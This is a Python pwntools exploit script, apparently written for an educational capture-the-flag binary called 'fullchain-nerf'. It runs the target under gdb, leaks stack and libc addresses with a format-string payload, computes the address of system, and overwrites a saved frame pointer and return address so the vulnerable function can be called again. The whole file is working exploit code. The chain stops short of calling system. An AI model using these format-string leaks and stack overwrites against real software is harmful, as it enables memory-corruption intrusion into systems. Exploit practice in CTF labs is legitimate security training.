from os import system
from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# Global Variable
call_chal_pos = 0
main_save_rbp = 0
libc_start_main_pos = 0
system_pos = 0

# Create Process
r = gdb.debug("./fullchain-nerf/share/fullchain-nerf",
              """
              aslr on
              b *chal+76
              b mywrite
              c
              """)
# r = remote("edu-ctf.zoolab.org", 30206)

# Helper Function
def send_cmd2srv(obj: str, cmd: str, payload: bytes = b""):
    global r
    r.sendlineafter(b"global or local > ", obj.encode())
    r.sendlineafter(b"set, read or write > ", cmd.encode())
    
    if len(payload):
        r.sendlineafter(b"length > ", str(len(payload)).encode())
        r.send(payload)

# Code Segament
def get_infinite_chal():
    global r, call_chal_pos, main_save_rbp, libc_start_main_pos, system_pos

    # Let me do More CHAL !!!
    # Main Return to Call Chal, Main RBP
    payload = b"%17$lx|%16$lx|%19$lx\n"
    send_cmd2srv("global", "read", payload)
    send_cmd2srv("global", "write")

    tmp = r.recvline().split(b"|")

    call_chal_pos = int(tmp[0].decode(), 16) - 10
    main_save_rbp = int(tmp[1].decode(), 16)
    libc_start_main_pos = int(tmp[2].decode(), 16) - 205
    system_pos = libc_start_main_pos + 0x22130

    log.info("Retrieve Call Chal Pos: " + hex(call_chal_pos))
    log.info("Retrieve Main Saved RBP: " + hex(main_save_rbp))
    # log.info("Retrieve Start Main Pos: " + hex(libc_start_main_pos))
    # log.info("Retrieve System Func Pos: " + hex(system_pos))

def set_infinite_chal():
    global r, call_chal_pos, main_save_rbp

    payload = flat(
        0, 0, 0, 0, 0, 0,
        main_save_rbp,
        call_chal_pos
    )

    send_cmd2srv("local", "read", payload)
    log.info("Successfully Set Infinite Chal Call !")

# Main Function
get_infinite_chal()
set_infinite_chal()

r.interactive()